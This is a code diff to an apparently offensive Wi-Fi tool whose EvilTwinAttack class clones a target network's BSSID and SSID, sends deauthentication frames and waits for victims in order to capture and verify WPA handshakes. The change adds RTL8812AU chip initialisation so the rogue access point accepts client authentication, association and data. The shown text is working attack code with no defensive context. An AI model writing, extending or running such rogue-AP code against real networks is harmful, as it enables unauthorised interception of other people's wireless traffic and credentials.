@@ -70,6 +70,7 @@ class EvilTwinAttack:
         self.handshake_file: Optional[Path] = None
         self._running = False
         self._step = 0
+        self._rtl_ap = None
 
     async def start(self, target_bssid: str, target_ssid: str,
                     channel: int, adapter, ep_rx: int, ep_tx: int,
@@ -164,10 +165,18 @@ class EvilTwinAttack:
                           ap_mac, deauth_interval):
         from .ap.ap_core import APStateMachine
         from .ap.frames import craft_beacon
+        from .usb.rtl8812au_ap import Rtl8812auAP
+        from .usb.device import get_ctrl_endpoint
 
         beacon = craft_beacon(ap_mac, ssid, channel, seq=0)
 
         deauth_frames = []
+
+        # Initialize RTL8812AU AP mode (configures chip to accept auth/assoc/data)
+        ep_ctrl = get_ctrl_endpoint(adapter)
+        rtl_ap = Rtl8812auAP(dev=adapter, ep_ctrl=ep_ctrl)
+        rtl_ap.init_ap_mode(ap_mac, ssid, channel)
+        self._rtl_ap = rtl_ap
 
         ap_sm = APStateMachine(ap_mac, ssid, channel,
                                usb_tx=self._create_worker_enqueue)
@@ -180,6 +189,7 @@ class EvilTwinAttack:
             beacon_frame=beacon,
             deauth_frames=deauth_frames,
             deauth_interval=deauth_interval,
+            rtl_ap=rtl_ap,
         )
         worker.start()
 
@@ -188,6 +198,7 @@ class EvilTwinAttack:
         await self._wait_for_clients(worker, timeout=300)
 
         worker.stop()
+        rtl_ap.deinit_ap_mode()
 
     async def _run_step_3(self):
         self._post_tui("🔐 Step 3: Verifying MIC...")
